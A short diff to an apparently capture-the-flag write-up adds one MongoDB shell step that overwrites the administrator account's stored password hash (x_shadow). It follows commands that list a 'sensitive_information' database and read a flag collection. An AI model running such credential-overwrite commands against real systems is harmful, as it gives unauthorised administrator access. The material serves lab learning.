@@ -55,6 +55,8 @@ test> use sensitive_information;
 sensitive_information> show collections;
 
 sensitive_information> db.flag.find()
+
+ace> db.admin.updateOne({name:'administrator'},{$set:{x_shadow:'$6$MAQvinWPLqmiLt9t$axLwiLf0fW7Ln60XYQoe2wwy1AbTMMXZw6mHB0vGRdVvPAXqIn9v4kPJiuYYwkrKvLzvhmwzbr0FbO6vRKFzT/'}});
 ```
 
 </details>
